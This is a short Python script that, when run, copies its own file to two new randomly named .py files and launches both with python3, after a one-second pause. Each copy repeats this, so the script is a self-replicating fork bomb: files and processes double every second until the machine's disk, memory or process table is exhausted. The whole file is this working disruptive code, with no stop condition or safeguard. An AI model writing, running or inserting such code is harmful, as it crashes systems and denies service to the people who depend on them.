import pathlib
import shutil
import uuid
import os
import time
import subprocess

def ownFileName():
    filename = os.path.basename(__file__)
    return filename

def newRandomName():
    filename = str(uuid.uuid4()) + ".py"
    return filename

def dupe():
    time.sleep(1)
    path = pathlib.Path(ownFileName())
    if path.exists():
        newFile = newRandomName()

        shutil.copy(ownFileName(), f"1{newFile}")
        shutil.copy(ownFileName(), f"2{newFile}")

        subprocess.Popen(["python3", f"1{newFile}"])
        subprocess.Popen(["python3", f"2{newFile}"])

dupe()
